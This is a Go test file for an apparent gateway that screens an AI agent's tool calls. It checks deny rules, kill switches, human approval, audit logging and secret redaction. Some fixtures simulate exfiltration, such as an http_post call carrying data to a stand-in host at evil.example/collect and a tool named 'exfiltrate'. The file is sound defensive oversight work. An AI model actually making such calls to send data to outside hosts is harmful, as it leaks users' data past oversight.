package gate

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/jsonrpc"

	"github.com/timeomy/tollgate/internal/approval"
	"github.com/timeomy/tollgate/internal/audit"
	"github.com/timeomy/tollgate/internal/config"
	"github.com/timeomy/tollgate/internal/policy"
)

func TestAllowedCallIsForwardedAndAudited(t *testing.T) {
	e := newEnv(t)
	fwd, _, req := e.call("echo", map[string]any{"text": "hi"})
	if !fwd {
		t.Fatal("echo was not forwarded")
	}
	result := json.RawMessage(`{"content":[{"type":"text","text":"hi"}]}`)
	out := e.sess.FromUpstream(t.Context(), &jsonrpc.Response{ID: req.ID, Result: result})
	if resp := out.(*jsonrpc.Response); string(resp.Result) != string(result) {
		t.Fatalf("result changed: %s", resp.Result)
	}
	calls := e.events(audit.Filter{Kind: audit.KindToolCall})
	results := e.events(audit.Filter{Kind: audit.KindToolResult})
	if len(calls) != 1 || calls[0].Decision != "allow" || len(results) != 1 || results[0].ResultDigest == "" {
		t.Fatalf("audit calls=%+v results=%+v", calls, results)
	}
	if rep := e.verifyLog(); !rep.OK() {
		t.Fatalf("verify: %v", rep.Problems)
	}
}

func TestDeniedCallNeverForwarded(t *testing.T) {
	e := newEnv(t)
	fwd, meta, _ := e.call("exfiltrate", map[string]any{"data": "x"})
	if fwd || meta.Decision != "deny" || meta.Reason != "dangerous_tool_blocked" {
		t.Fatalf("forwarded=%v meta=%+v", fwd, meta)
	}
	evs := e.events(audit.Filter{Decision: "deny"})
	if len(evs) != 1 || evs[0].PolicyIDs != "deny-dangerous-tools" {
		t.Fatalf("audit = %+v", evs)
	}
}

func TestKillSwitchTakesEffectOnNextCall(t *testing.T) {
	e := newEnv(t)
	if fwd, _, _ := e.call("echo", map[string]any{"text": "1"}); !fwd {
		t.Fatal("first call blocked")
	}
	if err := e.kill.Kill(t.Context(), "research-bot", "test", "tester"); err != nil {
		t.Fatal(err)
	}
	if fwd, meta, _ := e.call("echo", map[string]any{"text": "2"}); fwd || meta.Reason != policy.ReasonKillSwitch {
		t.Fatalf("call after kill: forwarded=%v meta=%+v", fwd, meta)
	}
	if err := e.kill.Resume(t.Context(), "research-bot", "", "tester"); err != nil {
		t.Fatal(err)
	}
	if err := e.kill.Kill(t.Context(), "", "global", "tester"); err != nil {
		t.Fatal(err)
	}
	if fwd, meta, _ := e.call("echo", map[string]any{"text": "3"}); fwd || meta.Reason != policy.ReasonKillSwitch {
		t.Fatalf("call after global kill: forwarded=%v meta=%+v", fwd, meta)
	}
	_ = e.kill.Resume(t.Context(), "", "", "tester")
	if fwd, _, _ := e.call("echo", map[string]any{"text": "4"}); !fwd {
		t.Fatal("call after resume blocked")
	}
}

func TestApprovalOutcomes(t *testing.T) {
	e := newEnv(t)
	url := map[string]any{"url": "https://evil.example/collect", "body": "x"}
	cases := []struct {
		status approval.Status
		fwd    bool
		reason string
	}{
		{approval.StatusExpired, false, policy.ReasonApprovalTimeout},
		{approval.StatusDenied, false, policy.ReasonApprovalDenied},
		{approval.StatusApproved, true, ""},
	}
	for _, c := range cases {
		var seen approval.Request
		e.approve = func(_ context.Context, r approval.Request) (approval.Result, error) {
			seen = r
			return approval.Result{Status: c.status, DecidedBy: "tester"}, nil
		}
		fwd, meta, _ := e.call("http_post", url)
		if fwd != c.fwd || (!fwd && meta.Reason != c.reason) {
			t.Errorf("%s: forwarded=%v meta=%+v", c.status, fwd, meta)
		}
		if seen.Tool != "http_post" || !strings.Contains(seen.ArgsJSON, "evil.example") {
			t.Errorf("approver did not see raw tool and args: %+v", seen)
		}
	}
	approved := e.events(audit.Filter{Decision: "allow", Tool: "http_post"})
	if len(approved) != 1 || approved[0].Reason != policy.ReasonApproved || approved[0].ApprovalID == "" {
		t.Fatalf("approved audit = %+v", approved)
	}
}

func TestCancelledNotificationStopsApprovalWait(t *testing.T) {
	e := newEnv(t)
	started := make(chan struct{})
	e.approve = func(ctx context.Context, _ approval.Request) (approval.Result, error) {
		close(started)
		<-ctx.Done()
		return approval.Result{Status: approval.StatusCancelled}, ctx.Err()
	}
	req := toolCall(t, "http_post", map[string]any{"url": "https://evil.example"})
	done := make(chan jsonrpc.Message, 1)
	go func() { _, down := e.sess.FromClient(context.Background(), req); done <- down }()
	<-started
	p, _ := json.Marshal(map[string]any{"requestId": req.ID.Raw()})
	e.sess.FromClient(t.Context(), &jsonrpc.Request{Method: "notifications/cancelled", Params: p})
	select {
	case msg := <-done:
		if !strings.Contains(string(msg.(*jsonrpc.Response).Result), policy.ReasonApprovalCancelled) {
			t.Fatalf("response = %s", msg.(*jsonrpc.Response).Result)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("cancel did not stop the approval wait")
	}
}

func TestAuditFailureFailsClosed(t *testing.T) {
	e := newEnv(t, func(d *Deps) { d.Audit = failingLog{} })
	if fwd, meta, _ := e.call("echo", map[string]any{"text": "hi"}); fwd || meta.Reason != policy.ReasonAuditUnavailable {
		t.Fatalf("forwarded=%v meta=%+v", fwd, meta)
	}
}

func TestMonitorModeForwardsButRecords(t *testing.T) {
	e := newEnv(t, func(d *Deps) { d.Mode = config.ModeMonitor })
	if fwd, _, _ := e.call("exfiltrate", map[string]any{"data": "x"}); !fwd {
		t.Fatal("monitor mode blocked a call")
	}
	evs := e.events(audit.Filter{Tool: "exfiltrate"})
	if len(evs) != 1 || evs[0].Reason != "monitor:dangerous_tool_blocked" {
		t.Fatalf("audit = %+v", evs)
	}
	// The kill switch still applies in monitor mode.
	_ = e.kill.Kill(t.Context(), "", "x", "t")
	if fwd, _, _ := e.call("echo", map[string]any{}); fwd {
		t.Fatal("monitor mode ignored the kill switch")
	}
}

func TestMalformedCall(t *testing.T) {
	e := newEnv(t)
	id, _ := jsonrpc.MakeID(float64(999))
	_, down := e.sess.FromClient(t.Context(), &jsonrpc.Request{ID: id, Method: "tools/call", Params: json.RawMessage(`{"name":"echo","arguments":[1,2]}`)})
	resp := down.(*jsonrpc.Response)
	if resp.Error == nil {
		t.Fatal("malformed arguments were not rejected")
	}
	if evs := e.events(audit.Filter{Decision: "deny"}); len(evs) != 1 || evs[0].Reason != policy.ReasonMalformedRequest {
		t.Fatalf("audit = %+v", evs)
	}
}

func TestSecretsRedactedFromAuditAndSpans(t *testing.T) {
	e := newEnv(t)
	secret := "AKIAIOSFODNN7EXAMPLE"
	e.call("echo", map[string]any{"text": "key " + secret, "api_key": "plain-secret-value"})
	evs := e.events(audit.Filter{})
	b, _ := json.Marshal(evs)
	for _, leak := range []string{secret, "plain-secret-value"} {
		if strings.Contains(string(b), leak) {
			t.Fatalf("audit log leaks %q: %s", leak, b)
		}
	}
	if evs[0].Reason != "secret_in_arguments" {
		t.Errorf("secret matcher did not trigger: %s", evs[0].Reason)
	}
	for _, sp := range e.spans.Ended() {
		for _, kv := range sp.Attributes() {
			if v := kv.Value.Emit(); strings.Contains(v, secret) || strings.Contains(v, "plain-secret-value") {
				t.Fatalf("span attribute %s leaks a secret", kv.Key)
			}
		}
	}
}

func TestNewSessionFailsClosed(t *testing.T) {
	e := newEnv(t)
	bad := e.deps
	bad.Audit = nil
	if _, err := NewSession(bad, e.sess.info); err == nil {
		t.Error("NewSession accepted missing audit log")
	}
	info := e.sess.info
	info.Agent.Name = ""
	if _, err := NewSession(e.deps, info); err == nil {
		t.Error("NewSession accepted missing agent")
	}
}
